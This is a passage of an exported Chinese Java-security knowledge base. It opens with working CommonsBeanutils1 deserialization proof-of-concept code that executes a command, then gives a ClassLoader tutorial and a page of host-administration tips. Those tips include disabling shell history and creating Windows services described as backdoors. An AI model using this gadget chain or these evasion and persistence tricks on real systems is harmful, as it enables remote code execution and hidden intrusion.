cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); BeanComparator comparator = new BeanComparator(\"lowestSetBit\"); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(new BigInteger(\"1\")); queue.add(new BigInteger(\"1\")); Field f = comparator.getClass().getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; queueArray[1] = templates; try{ ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(queue); objectOutputStream.close(); ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } POC_1 将compartor在最后反射写入其中，正常赋值，只是在最后要进行序列化的时候通过反射将其更改 看起来比较多余，相当于对代码进行了review，更明白了反序列化的目的以及反射的高级 package com.cb1; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.util.PriorityQueue; public class TestCB1_1 { public static void main(String[] args)throws Exception { ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = pool.makeClass(\"Cat\"); String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"open /System/Applications/Calculator.app\\\");\"; cc.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\"+System.nanoTime(); cc.setName(randomName); cc.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classByte = cc.toBytecode(); byte[][] targetByteCodes = new byte[][]{classByte}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field field = templates.getClass().getDeclaredField(\"_bytecodes\"); field.setAccessible(true); field.set(templates,targetByteCodes); Field fieldName = templates.getClass().getDeclaredField(\"_name\"); fieldName.setAccessible(true); fieldName.set(templates,\"1\"); PriorityQueue queue = new PriorityQueue(2); queue.add(1); queue.add(1); Constructor constructor = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredConstructor(); BeanComparator comparator = (BeanComparator) constructor.newInstance(); Field f = Class.forName(\"org.apache.commons.beanutils.BeanComparator\").getDeclaredField(\"property\"); f.setAccessible(true); f.set(comparator,\"outputProperties\"); Field f1 = queue.getClass().getDeclaredField(\"comparator\"); f1.setAccessible(true); f1.set(queue,comparator); Field f2 = queue.getClass().getDeclaredField(\"queue\"); f2.setAccessible(true); Object[] queueArray = (Object[]) f2.get(queue); queueArray[0] = templates; try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); FileInputStream fileInputStream = new FileInputStream(\"cb1.ser\"); ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream); objectInputStream.readObject(); }catch (Exception e){ e.printStackTrace(); } } } Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-22 21:58:26 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/20.CommonsBeanutils1/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/21.ClassLoader详解/":{"url":"知识库/02.JAVA安全/21.ClassLoader详解/","title":"21.ClassLoader详解","keywords":"","body":" 简介 Class文件 环境变量 JAVA_HOME PATH CLASSPATH JAVA类加载流程 ExClassLoader 源码 APPClassLoader 源码 每一个类加载器都有一个父加载器 父加载器不是父类 双亲委托 重要方法 loadClass() 自定义ClassLoader 自定义步骤 defineClass() 示例 测试 总结 参考 简介 ClassLoader就是类加载器，普通的Java开发其实利用得并不多，对于某些开发框架中却非常常见，理解ClassLoader的加载机制，有利于写出高效的代码。ClassLoader的具体作用就是将Class文件加载到JVM中，程序就可以正常运行了。但是JVM启动的时候，并不会一次性加载所有的Class文件，而是需要动态加载 Class文件 Java程序是运行在虚拟机中，平常使用idea等工具编写的java代码为.java文件，这就是最基础的源码，但是这类文件是无法直接运行的，如下图所示 当在命令行中对java文件进行编译，然后就会生成class文件 javac HelloWorld.java 然后再执行 java HelloWorld 以上代码是一个示例，是入门Java 语言时的Hello World示例，可以看到class问及哦安是字节码格式文件，Java虚拟机并不能直接识别.java源文件，所以需要javac 将其转换成.class文件。另外，如果用C或者Python编写的程序正确转化成.class文件，java虚拟机也可以识别运行的 环境变量 JAVA_HOME 指Jdk 安装的目录 PATH 指将·${JAVA_HOME}/bin添加到系统PATH变量中，这样就可以任意位置调用java和javac命令，而不是使用绝对路径，或者在${JAVA_HOME}/bin 目录（相对路径）下执行java或者javac命令 CLASSPATH 指向jdk中的lib包，可以理解为刚开始学C语言那会儿，需要安装VC++的库，然后就可以直接使用#include这样，只不过C是直接在环境变量里可以直接调用，jdk的工具类需要单独引用 JAVA类加载流程 Java自带3个类加载器 BootStrapClassLoader 最顶层的加载类，主要加载核心类库，${JAVA_HOME}/lib下的rt.jar、resource.jar、charsets.jar和class等。另外需要注意的是可以通过启动jvm时指定-Xbootclasspath和路径来改变BootStrap ClassLoader的加载目录。比如java -Xbootclasspath/a:path被指定的文件追加到默认的bootstrap路径中 ExtentionClassLoader 扩展的类加载器，加载目录${JAVA_HOME}/lib/ext目录下的jar包和class文件。还可以加载-D java.ext.dirs选项指定的目录 AppClassLoader 也被称为SystyemAppClass 加载当前应用的classpath的所有类 以上3个类加载器，执行顺序如下所示 BootStrap ClassLoader Extention ClassLoader AppClass Loader 为了更好的理解，可以查看源码，sun.misc.Launcher，它是以一个java虚拟机的入口应用 public class Launcher { private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } //设置AppClassLoader为线程上下文类加载器，这个文章后面部分讲解 Thread.currentThread().setContextClassLoader(loader); } /* * Returns the class loader used to launch the main application. */ public ClassLoader getClassLoader() { return loader; } /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader {} /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader {} 源码中有简化，但是可以看到 Launcher 初始化了ExClassLoader 和 AppClassLoader Launcher 中并没有看到BootstrapClassLoader，但是通过System.getProperty(\"sun.boot.class.path\") 得到了字符串bootClassPath，这个就是BootStrapClassLoader加载的jar包 可以看到在${JAVA_HOEM}/jre/lib目录下的jar包和classes ExClassLoader 源码 /* * The class loader used for loading installed extensions. */ static class ExtClassLoader extends URLClassLoader { static { ClassLoader.registerAsParallelCapable(); } /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { int len = dirs.length; for (int i = 0; i 之前的内容可以指定-D java.ext.dirs参数来添加和改变ExtClassLoader的加载路径 System.out.println(System.getProperty(\"java.ext.dirs\")); APPClassLoader 源码 /** * The class loader used for loading from java.class.path. * runs in a restricted security context. */ static class AppClassLoader extends URLClassLoader { public static ClassLoader getAppClassLoader(final ClassLoader extcl) throws IOException { final String s = System.getProperty(\"java.class.path\"); final File[] path = (s == null) ? new File[0] : getClassPath(s); return AccessController.doPrivileged( new PrivilegedAction() { public AppClassLoader run() { URL[] urls = (s == null) ? new URL[0] : pathToURLs(path); return new AppClassLoader(urls, extcl); } }); } ...... } 可以看到AppClassLoader加载的就是java.class.path的值 System.out.println(System.getProperty(\"java.class.path\")); 这个路径其实就是当前Java工程的目录，里面存放的是编译生成的class文件 BootStrapClassLoader、ExtClassLoader、AppClassLoader实际就是查询相应的环境属性：sun.boot.class.path，java.ext.dirs，java.class.path 来加载源文件 然后再来探讨加载顺序，使用上例中的HelloWorld.java创建一个ClassLoaderTest.java文件 // HelloWorld.java public HelloWorld {} // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl); } } ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a 也就是说明HelloWorld就是由AppClassLoader加载的，如果是int.class，String.class的加载呢？ // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); cl = int.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); } } 运行发现报错 ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a Exception in thread \"main\" java.lang.NullPointerException at com.test.ClassLoaderTest.main(ClassLoaderTest.java:8) 提示是空指针，因为int.class 是由BootstrapClassLoader，要想弄明白这些，首先得知道一个前提 每一个类加载器都有一个父加载器 每个类加载器都有一个父加载器，比如加载HelloWorld.class是由AppClassLoader完成，那么AppClassLoader也有一个父加载器，怎样获取呢？很简单，通过getParent方法 // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); System.out.println(\"ClassLoader's parent is \" + cl.getParent().toString()); } } 运行结果如下 ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a ClassLoader's parent is sun.misc.Launcher$ExtClassLoader@45ee12a7 这个就说明AppClassLoader的父加载器是ExtClassLoader，再看示例 // ClassLoaderTest.java public class ClassLoaderTest { public static void main(String[] args) { ClassLoader cl = HelloWorld.class.getClassLoader(); System.out.println(\"ClassLoader is \" + cl.toString()); System.out.println(\"ClassLoader's parent is \" + cl.getParent().toString()); System.out.println(\"ClassLoader's grandParent is \" + cl.getParent().getParent().toString()); } } 运行结果如下： ClassLoader is sun.misc.Launcher$AppClassLoader@7f31245a ClassLoader's parent is sun.misc.Launcher$ExtClassLoader@45ee12a7 Exception in thread \"main\" java.lang.NullPointerException at com.test.ClassLoaderTest.main(ClassLoaderTest.java:8) 进程已结束,退出代码1 又是一个空指针异常，这表明ExClassLoader没有父加载器？如果没有为什么标题要写每一个类加载器都有一个父加载器呢？ 父加载器不是父类 在源码处可以看到ExtClassLoader和AppClassLoader的代码 static class ExtClassLoader extends URLClassLoader {} static class AppClassLoader extends URLClassLoader {} 可以看见ExtClassLoader和AppClassLoader都是继承URLClassLoader，但是在上一节代码中，为什么调用AppClassLoader的getParent()代码会得到ExtClassLoader的实例呢？我们可以先从URLCLassLoader说起 URLClassLoader的源码中并没有找到getParent() 方法，这个方法在ClassLoader.java中 public class Launcher { private static URLStreamHandlerFactory factory = new Factory(); private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { //将ExtClassLoader对象实例传递进去 loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } public ClassLoader getClassLoader () { return loader; } static class ExtClassLoader extends URLClassLoader { /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { //ExtClassLoader在这里创建 return new ExtClassLoader(dirs); } }); } catch (java.security.PrivilegedActionException e) { throw (IOException) e.getException(); } } /* * Creates a new ExtClassLoader for the specified directories. */ public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } } } 可以看到getParent()方法其实就是返回一个ClassLoader对象的parent，parent的赋值是在ClassLoader对象的构造方法中，他有两个情况 由外部类创建ClassLoader时直接指定一个ClassLoader为Parent 由getSystemClaassLoader()方法生成，也就是在sun.misc.Launcher通过getClassLoader()获取，也就是AppClassLoader。直白的说，一个ClassLoader创建时如果没有指定parent，那么它的parent默认就是AppClassLoader 我们主要研究的是ExtClassLoader与AppClassLoader的parent的来源，正好它们与Launcher类有关 public class Launcher { private static URLStreamHandlerFactory factory = new Factory(); private static Launcher launcher = new Launcher(); private static String bootClassPath = System.getProperty(\"sun.boot.class.path\"); public static Launcher getLauncher() { return launcher; } private ClassLoader loader; public Launcher() { // Create the extension class loader ClassLoader extcl; try { extcl = ExtClassLoader.getExtClassLoader(); } catch (IOException e) { throw new InternalError( \"Could not create extension class loader\", e); } // Now create the class loader to use to launch the application try { //将ExtClassLoader对象实例传递进去 loader = AppClassLoader.getAppClassLoader(extcl); } catch (IOException e) { throw new InternalError( \"Could not create application class loader\", e); } public ClassLoader getClassLoader () { return loader; } static class ExtClassLoader extends URLClassLoader { /** * create an ExtClassLoader. The ExtClassLoader is created * within a context that limits which files it can read */ public static ExtClassLoader getExtClassLoader() throws IOException { final File[] dirs = getExtDirs(); try { // Prior implementations of this doPrivileged() block supplied // aa synthesized ACC via a call to the private method // ExtClassLoader.getContext(). return AccessController.doPrivileged( new PrivilegedExceptionAction() { public ExtClassLoader run() throws IOException { //ExtClassLoader在这里创建 return new ExtClassLoader(dirs); } }); } catch (java.security.PrivilegedActionException e) { throw (IOException) e.getException(); } } /* * Creates a new ExtClassLoader for the specified directories. */ public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } } } 可以看到，AppClassLoader的parent是一个ExtClassLoader实例 ClassLoader extcl; extcl = ExtClassLoader.getExtClassLoader(); loader = AppClassLoader.getAppClassLoader(extcl) ExtClassLoader并没有直接找到对应的parent赋值，它调用了它的父类也就是URLCLassLoader的构造方法并传递了3个参数 public ExtClassLoader(File[] dirs) throws IOException { super(getExtURLs(dirs), null, factory); } public URLClassLoader(URL[] urls, ClassLoader parent, URLStreamHandlerFactory factory) { super(parent); } 在这里可以看到ExtClassLoader的parent为null，但是ExtClassLoader的父加载器为null，但是BootStrapClassLoader却可以当成他的父加载器 BootStrapClassLoader 是由C/C++编写的，它本身是虚拟机的一部分，所以它并不是Java类，也就是无法在java代码中获取它的引用，JVM启动时是通过BootStrap类加载器加载rt.jar等核心jar包中的class文件，之前的int.class，String.class都是由它加载。在前面我们知道JVM初始化sun.misc.Launcher并创建ExtClassLoader和AppClassLoader实例，并将ExtClassLoader设置为AppClassLoader的父加载器。BootStrap没有父加载器，但是它却可以作用一个ClassLoader的父加载器。比如ExtClassLoader。这也可以解释之前通过ExtClassLoader的getParent方法取为NUll的现象 双亲委托 一个类加载器查找class和resource时，是通过“委托模式”进行的，它首先判断这个class是否已经加载成功，如果没有的话，它并不是自己进行查找，而是先通过父加载器，然后递归下去，知道BootStrapClassloader，如果BootStrapClassloader找到了，直接返回，乳沟没有找到，则一级一级返回，最后到达自身去查找这些对象，这种机制就叫做双亲委托 整个流程如下图所示 一个AppClassLoader查找资源时，先看看缓存是否有，缓存有从缓存中获取，否则委托给父加载器。 递归，重复第1部的操作。 如果ExtClassLoader也没有加载过，则由Bootstrap ClassLoader出面，它首先查找缓存，如果没有找到的话，就去找自己的规定的路径下，也就是sun.mic.boot.class下面的路径。找到就返回，没有找到，让子加载器自己去找。 Bootstrap ClassLoader如果没有查找成功，则ExtClassLoader自己在java.ext.dirs 路径中去查找，查找成功就返回，查找不成功，再向下让子加载器找。 ExtClassLoader查找不成功，AppClassLoader就自己查找，在java.class.path路径下查找。找到就返回。如果没有找到就让子类找，如果没有子类就会抛出各种异常。 重要方法 loadClass() JDK文档是这样写的，通过指定的全限定类名加载class，通过同名的loadClass(String,boolean)方法 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException 一般实现这个方法的步骤是 执行findLoadedClass(String) 去检测这个class是不是已经加载过了 执行父加载器的loadClass方法。如果父加载器为null，则jvm哪值的加载器去替代，也就是BootStrapClassLoader，这也解释了ExtClassLoader的parent为null，但仍然说BootStrapClassLoader是它的父加载器 如果向上委托父加载器没有加载成功，则通过findClass(String)查找 如果class在前面两步中找到吗参数resolve又是true的话，那么loadClass()又会调用resolveClass(class)这个方法来生成最终的Class对象 protected Class loadClass(String name, boolean resolve) throws ClassNotFoundException { synchronized (getClassLoadingLock(name)) { // 首先，检测是否已经加载 Class c = findLoadedClass(name); if (c == null) { long t0 = System.nanoTime(); try { if (parent != null) { //父加载器不为空则调用父加载器的loadClass c = parent.loadClass(name, false); } else { //父加载器为空则调用Bootstrap Classloader c = findBootstrapClassOrNull(name); } } catch (ClassNotFoundException e) { // ClassNotFoundException thrown if class not found // from the non-null parent class loader } if (c == null) { // If still not found, then invoke findClass in order // to find the class. long t1 = System.nanoTime(); //父加载器没有找到，则调用findclass c = findClass(name); // this is the defining class loader; record the stats sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0); sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1); sun.misc.PerfCounter.getFindClasses().increment(); } } if (resolve) { //调用resolveClass() resolveClass(c); } return c; } } 代码解释了双亲委托 另外，要注意的是如果要编写一个classLoader的子类，也就是定义一个classloader，建议覆盖findClass()方法，而不要直接修改loadClass()方法 if (parent != null) { //父加载器不为空则调用父加载器的loadClass c = parent.loadClass(name, false); } else { //父加载器为空则调用Bootstrap Classloader c = findBootstrapClassOrNull(name); } 前面说过ExtClassLoader的parent为null，所以它向上委托时，系统会为它指定Bootstrap ClassLoader。 自定义ClassLoader 不管是BootStrapClassLoader还是ExtClassLoader，这些类加载器都只是加载指定目录下的jar包或者资源。那如果需要动态加载一些资源呢？ 自定义步骤 编写一个类继承ClassLoader类 复写他的findClass() 方法 在findClass()方法中调用defineClass() defineClass() 这个方法在编写自定义classloader的时候非常重要，他能将class二进制内容转换成Class对象，如果不符合要求则会抛出各种异常 一个ClassLoader创建时如果没有指定parent，那么他的parent默认就是AppClassloader 上面说的是，如果自定义一个ClassLoader，默认的parent父加载器是AppClassLoader，因为这样就能够保证它能访问系统内置加载器加载成功的class文件。 示例 假设我们需要一个自定义的classloader，默认路径为~/Desktop/lib下的jar包和资源 首先编写一个测试类Test.java package com.test; public class Test{ public void say(){ System.out.println(\"Say Hello\"); } } 然后将其编译成class文件 Test.class放到~/Desktop/lib目录下 package com.test; import java.io.*; public class ClassLoaderTest extends ClassLoader { private String mLibPath; public ClassLoaderTest(String path) { this.mLibPath = path; } protected Class findClass(String name) throws ClassNotFoundException { String filename = getFileName(name); File file = new File(mLibPath, filename); try { FileInputStream fileInputStream = new FileInputStream(file); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int len = 0; try { while ((len = fileInputStream.read()) != -1) { byteArrayOutputStream.write(len); } } catch (IOException e) { e.printStackTrace(); } byte[] bytes = byteArrayOutputStream.toByteArray(); fileInputStream.close(); byteArrayOutputStream.close(); return defineClass(name, bytes, 0, bytes.length); } catch (IOException e) { e.printStackTrace(); } return super.findClass(name); } private String getFileName(String name) { int index = name.lastIndexOf('.'); if (index == -1) { return name + \".class\"; } else { return name.substring(index + 1) + \".class\"; } } } 我们在findClass()方法中定义了查找class的方法，然后数据通过defineClass()生成了Class对象。 测试 现在编写测试代码。我们知道如果调用一个Test对象的say方法，它会输出\"Say Hello\"这条字符串。但现在是我们把Test.class放置在应用工程所有的目录之外，我们需要加载它，然后执行它的方法。 package com.test; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Main { public static void main(String[] args) { ClassLoaderTest classLoaderTest = new ClassLoaderTest(\"~/Desktop/lib\"); try { Class c = classLoaderTest.loadClass(\"com.test.Test\"); if (c != null) { Object object = c.newInstance(); Method method = c.getDeclaredMethod(\"say\",null); method.invoke(object,null); } } catch (ClassNotFoundException | NoSuchMethodException | InstantiationException | IllegalAccessException e) { e.printStackTrace(); } catch (InvocationTargetException e) { throw new RuntimeException(e); } } } 执行之后，可以看到，在~/Desktop/lib/Test.class被加载了 突破了JDK系统内置加载路径的限制之后，我们就可以编写自定义ClassLoader，然后剩下的就叫给开发者你自己了。你可以按照自己的意愿进行业务的定制，将ClassLoader玩出花样来。 总结 ClassLoader是用来加载class文件的 系统内置的ClassLoader通过双亲委托来加载指定路径下的class和资源 可以自定义ClassLoader一般覆盖findClass方法 ContextClassLoader与线程相关，可以获取设置，可以绕过双亲委托机制 参考 https://blog.csdn.net/briblue/article/details/54973413 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-30 14:02:33 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/21.ClassLoader详解/ Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html":{"url":"知识库/03.主机安全/01.主机乱七八糟的问题汇总（持续更新）.html","title":"01.主机乱七八糟的问题汇总（持续更新）","keywords":"","body":" CentOS 7 编译安装nginx，如何将其加入到服务（nginx.service）？ Linux 写入/usr/lib/systemd/system/xxx.service 不生效解决办法 nginx 如何配置Basic认证？ docker Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 背景 解决办法 Docker启动镜像 启动镜像 Docker清除缓存 umount devices is busy？ linux history添加执行的时间 bash shell 登录shell，执行命令使其不保存至history？ 如何查看文件md5，sha1，sha256等（主要是windows） Linux windows windows 新建删除服务 删除服务 新建服务 Linux 安装pip2,pip3 Linux 更新pip2 pip3 Linux 启动IDEA 报错 Error opening zip file or JAR manifest missing : /home/luogan/.jetbrains/jetbrains-agent-v3.2.0.de72.619 Error occurred during initialization of VM 背景 Linux 配置开机自动挂载硬盘 背景 自动挂载 rpm 包与 deb包相互转换 Linux 执行命令时错误返回在shell时，如何将其去掉？ windows 和 Linux shell的转义符 windows、Linux 在终端中如何设置临时代理 windows Linux Linux 更新系统字体 JDK1.7 在macos版本的idea 运行警告 解决方式 MacOS docker 换源 Kali 2019.4 换源之后，apt update 报错 CentOS 7 编译安装nginx，如何将其加入到服务（nginx.service）？ # 默认编译安装到/usr/local/nginx # 在 /usr/lib/systemd/system/目录下创建服务 cd /usr/lib/systemd/system/ touch nginx.service vim nginx.service # 添加如下内容 [Unit] Description=nginx - high performance web server Documentation=http://nginx.org/en/docs/ After=network.target remote-fs.target nss-lookup.target [Service] Type=forking PIDFile=/usr/local/nginx/logs/nginx.pid ExecStartPre=/usr/local/nginx/sbin/nginx -t -c /usr/local/nginx/conf/nginx.conf ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf ExecReload=/bin/kill -s HUP $MAINPID ExecStop=/bin/kill -s QUIT $MAINPID PrivateTmp=true [Install] WantedBy=multi-user.target Linux 写入/usr/lib/systemd/system/xxx.service 不生效解决办法 systemctl daemon-reload nginx 如何配置Basic认证？ 配置nginx，新增server节点 针对es 配置 nginx basic 认证 server { listen 9201; server_name elasticSearch; location / { proxy_pass http://127.0.0.1:9200/; auth_basic \"nginx basic http for es\"; auth_basic_user_file conf.d/passwd; autoindex on; } } 再使用 openssl 或者htpasswd 生成密码文件(推荐使用openssl，系统自带，htpasswd可自行查询)，格式如下： 此处conf.d/passwd 是在/usr/local/nginx/conf/conf.d/passwd # openssl（默认自带） printf \"your_username:$(openssl passwd -crypt your_password)\\n\" >> conf.d/passwd 生成密码之后，使用如下命令检查配置文件是否正确 nginx -t 重启nginx docker Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 背景 由于尝试做docker api 未授权rce 漏洞，将docker.service 中的ExecStart 修改成了对外开放2375端口，最后测试完毕之后，将注释去掉之后，systemctl daemon-reload 之后启动成功之后，报错如下: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running? 且查看 systemctl status docker ，发现目标为active:running，且无/var/run/docker.sock文件 解决办法 将fd:// 更改为 unix://，然后重新加载systemctl daemon-reload，systemctl restart docker Docker启动镜像 在docker 中 要找一个新的镜像，我们首先要查看需要下载的镜像,这里以mysql举例 docker search mysql docker pull mysql 拉取完成之后，查看所有的镜像 docker images -a 启动镜像 docker run -p 本机映射端口:镜像映射端口 -d --name 启动镜像名称 -e 镜像启动参数 镜像名称:版本 # -p 本机端口和容器端口映射 # -d 后台运行 # --name 容器名称 # -e 镜像启动参数 例：https://hub.docker.com/_/mysql docker run --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:tag 查看相关参数从hub.docker.com 中寻找，或者网传使用runlike docker run -p 3306:3306 -d --name mysql-aaron -e MYSQL_ROOT_PASSWORD=admin mysql:latest 运行完之后就可以看到容器已经启动 Docker清除缓存 docker system prune --volumes umount devices is busy？ NFS未授权挂载经常会出现此类问题 原因：因为有多个进程在使用，所以无法取消挂载，当将所有的进程kill掉之后，再umount即可 使用fuser命令罗列出pid fuser -v -m -v 表示 verbose 模式。进程以 ps 的方式显示，包括 PID、USER、COMMAND、ACCESS 字段 -m 表示指定文件所在的文件系统或者块设备（处于 mount 状态）。所有访问该文件系统的进程都被列出。 linux history添加执行的时间 bash shell 编辑/etc/profile 在最下方添加 HISTTIMEFORMAT=\"%Y-%m-%d %H:%M:%S\" 保存后退出，执行 source /etc/profile 效果如下 zsh 不需要配置，只需要执行 # 标准日期 history -i # 英文日期 history -E 登录shell，执行命令使其不保存至history？ set +o history 如何查看文件md5，sha1，sha256等（主要是windows） Linux 在linux中，查看文件md5，sha1，sha256等等都很简单，只需要键入命令 md5sum output b5cd11c42c9031cad6515ff62f4e03ac output sha1sum output 6c2c76a15c272db2b582e8f7d47c1f64b9b2f32c output sha256sum output a4ed89f176e5200ebe571631bd2fdb0d6e18a9ce7b5d78eb69b4a3abd538898b output windows certutil -hashfile MD5 certutil -hashfile SHA1 certutil -hashfile SHA256 windows 新建删除服务 常常用作后门 删除服务 sc delete 服务名称 新建服务 sc create monitor binpath= \"可执行文件exe绝对路径 --service -r 可执行文件根路径\" displayname= \"监控文件夹\" start= auto # sc create monitor binpath= \"D:\\Software\\OtherTool\\MonitorFolder.exe --service -r D:\\Software\\OtherTool\" displayname= \"监控文件夹\" start= auto Linux 安装pip2,pip3 // pip2 wget https://bootstrap.pypa.io/pip/2.7/get-pip.py python2 get-pip.py // pip3 wget https://bootstrap.pypa.io/get-pip.py # 如果这里报错 ModuleNotFoundError: No module named 'distutils.util' # 执行如命令 apt install -f apt-get install python3-distutils python3 get-pip.py Linux 更新pip2 pip3 python2 -m pip install --upgrade pip python3 -m pip install --upgrade pip Linux 启动IDEA 报错 Error opening zip file or JAR manifest missing : /home/luogan/.jetbrains/jetbrains-agent-v3.2.0.de72.619 Error occurred during initialization of VM 背景 重装了idea，之前使用激活工具激活 find / -name \"*vmoptions*\" 删除/home/${User}/.IntelliJIdea2019.3/即可 Linux 配置开机自动挂载硬盘 背景 由于公司新发的thinkpad是SSD + HD ，我将操作系统装在了固态硬盘上，但是固态硬盘只有128G，HD却有500G，所以我只有格式化硬盘，将其挂载到我的硬盘上，具体如下所示 首先我们知道Linux是文件系统，硬盘也不例外，硬盘的标识是在/dev/sda0-6 sudo fdisk -l 可以看到我这里的硬盘是/dev/sda1，那么我将其挂载上的命令如下 sudo mount /dev/sda1 /my_HD mount | grep my_HD df -h 手动挂载虽然也行，但是毕竟不是服务器，不会不关机，那么就需要开机自动挂载硬盘 自动挂载 使用blkid命令查看磁盘uuid sudo blkid 可以看到/dev/sda1就是我的硬盘，Type是ext4，需要关注一下Type，linux 分区一般为 ext4，windows 分区一般为 ntfs 编辑/etc/fstab，将分区信息写入 /etc/fstab 文件启动自动挂载 sudo vim /etc/fstab UUID=744c071c-5e78-4dab-9d4c-cac5ea8e975d /my_HD ext4 defaults 0 1 注： ：分区定位，可以给UUID或LABEL，例如：UUID=6E9ADAC29ADA85CD或LABEL=software ：具体挂载点的位置，例如：/data：挂载磁盘类型,linux 分区一般为 ext4，windows 分区一般为 ntfs ：挂载参数，一般为defaults ：磁盘检查，默认为0 ：磁盘检查，默认为0，不需要检查 第一个叫fs_freq,用来决定哪一个文件系统需要执行dump操作，0就是不需要； 第二个叫fs_passno,是系统重启时fsck程序检测磁盘的顺序号 1 是root文件系统，2 是别的文件系统。fsck按序号检测磁盘，0表示该文件系统不被检测 dump 执行ext2的文件系统的备份操作 fsck 检测和修复文件系统 修改完成之后，执行 sudo mount -a rpm 包与 deb包相互转换 sudo apt intall alien sudo alien XMind-for-Linux-x86-64bit-11.0.1-202106220606.rpm Linux 执行命令时错误返回在shell时，如何将其去掉？ 